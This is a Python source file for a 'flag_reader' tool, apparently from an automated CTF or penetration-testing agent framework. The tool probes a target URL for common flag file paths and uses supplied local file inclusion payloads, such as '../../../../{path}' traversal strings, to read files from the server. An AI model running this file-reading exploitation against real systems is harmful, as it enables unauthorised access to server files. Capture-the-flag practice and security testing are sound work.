"""Flag file reader tool for CTF challenges."""
from __future__ import annotations

import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse

from ..base import BaseTool, ToolResult
from .._http import normalise_target, request


# Common flag file paths in CTF environments
_FLAG_PATHS: List[str] = [
    "/flag",
    "/flag.txt",
    "/root/flag",
    "/root/flag.txt",
    "/home/ctf/flag",
    "/home/ctf/flag.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/var/flag",
    "/var/flag.txt",
    "/flag.php",
    "/flag.html",
    "/secret",
    "/secret.txt",
    "/key",
    "/key.txt",
]

# Regex patterns to identify CTF flags
_FLAG_PATTERNS: List[re.Pattern] = [
    re.compile(r'flag\{[^}]+\}', re.IGNORECASE),
    re.compile(r'ctf\{[^}]+\}', re.IGNORECASE),
    re.compile(r'[A-Z0-9_]+\{[a-zA-Z0-9_\-!@#$%^&*()+=.]+\}'),
    re.compile(r'[0-9a-f]{32}'),   # MD5-like hash
    re.compile(r'[0-9a-f]{40}'),   # SHA1-like hash
    re.compile(r'[0-9a-f]{64}'),   # SHA256-like hash
]


def _extract_flag(text: str) -> Optional[str]:
    """Try to extract a flag from text using common CTF flag patterns."""
    for pattern in _FLAG_PATTERNS:
        match = pattern.search(text)
        if match:
            return match.group(0)
    return None


def _build_lfi_url(base_url: str, lfi_payload: str, param: str) -> str:
    """Build a URL with an LFI payload injected into the given parameter."""
    p = urlparse(base_url)
    params = dict(parse_qsl(p.query, keep_blank_values=True))
    params[param] = lfi_payload
    return urlunparse(p._replace(query=urlencode(params, doseq=True)))


class FlagReaderTool(BaseTool):
    category = "ctf_web"
    requires_exploit_enabled = True
    required_capability = "exploit"

    @property
    def name(self) -> str:
        return "flag_reader"

    @property
    def description(self) -> str:
        return (
            "Read CTF flag files from a target web application. "
            "Tries common flag paths (/flag, /flag.txt, /root/flag, etc.) directly, "
            "or uses a provided LFI payload to read flag files via file inclusion. "
            "Automatically detects flag patterns (flag{...}, CTF{...}, hex hashes)."
        )

    def parameters_schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target base URL of the web application.",
                },
                "lfi_payload": {
                    "type": "string",
                    "description": (
                        "Optional LFI payload template. If provided, flag paths are injected "
                        "via this payload. Example: '../../../../{path}' or a PHP filter wrapper."
                    ),
                },
                "lfi_param": {
                    "type": "string",
                    "description": "Parameter name to use when injecting LFI payload. Required if lfi_payload is set.",
                },
            },
            "required": ["url"],
        }

    def _run(self, **kwargs: Any) -> ToolResult:
        url = normalise_target(kwargs.get("url", ""))
        if not url:
            return ToolResult(False, self.name, "url is required", error="missing_args")

        lfi_payload = kwargs.get("lfi_payload", "")
        lfi_param = kwargs.get("lfi_param", "file")

        attempts: List[str] = []
        errors: List[str] = []

        # Strategy 1: Direct HTTP access to flag paths
        for flag_path in _FLAG_PATHS:
            try:
                target = url.rstrip("/") + flag_path
                resp, err, _ = request("GET", target, timeout=10)

                if err or resp is None:
                    errors.append(f"GET {flag_path}: {err}")
                    continue

                if resp.status_code in (200, 302):
                    body = resp.text or ""
                    flag = _extract_flag(body)
                    if flag:
                        return ToolResult(
                            success=True,
                            tool=self.name,
                            summary=f"Flag found at {flag_path}: {flag}",
                            raw_output=body[:500],
                            parsed_data={
                                "found": True,
                                "flag": flag,
                                "path": flag_path,
                                "method": "direct_access",
                                "url": target,
                                "content_excerpt": body[:200],
                            },
                        )
                    # No flag pattern but got content — record it
                    if body.strip():
                        attempts.append(f"GET {flag_path} → HTTP {resp.status_code}, content: {body[:100]!r}")

            except Exception as exc:  # noqa: BLE001
                errors.append(f"Error accessing {flag_path}: {exc}")
                continue

        # Strategy 2: LFI-based flag reading
        if lfi_payload:
            for flag_path in _FLAG_PATHS:
                try:
                    # Substitute {path} placeholder or append flag_path to payload
                    if "{path}" in lfi_payload:
                        injected = lfi_payload.replace("{path}", flag_path.lstrip("/"))
                    else:
                        injected = lfi_payload + flag_path

                    test_url = _build_lfi_url(url, injected, lfi_param)
                    resp, err, _ = request("GET", test_url, timeout=10)

                    if err or resp is None:
                        errors.append(f"LFI {flag_path}: {err}")
                        continue

                    body = resp.text or ""
                    flag = _extract_flag(body)
                    if flag:
                        return ToolResult(
                            success=True,
                            tool=self.name,
                            summary=f"Flag found via LFI at {flag_path}: {flag}",
                            raw_output=body[:500],
                            parsed_data={
                                "found": True,
                                "flag": flag,
                                "path": flag_path,
                                "method": "lfi",
                                "lfi_payload": injected,
                                "url": test_url,
                                "content_excerpt": body[:200],
                            },
                        )

                    if body.strip() and resp.status_code == 200:
                        attempts.append(
                            f"LFI {flag_path} → HTTP {resp.status_code}, content: {body[:100]!r}"
                        )

                except Exception as exc:  # noqa: BLE001
                    errors.append(f"Error with LFI for {flag_path}: {exc}")
                    continue

        return ToolResult(
            success=True,
            tool=self.name,
            summary="Flag not found. Tried direct access and LFI paths.",
            raw_output="\n".join(attempts + errors),
            parsed_data={
                "found": False,
                "flag": None,
                "path": None,
                "method": None,
                "attempts": attempts,
                "errors": errors[:10],
            },
        )
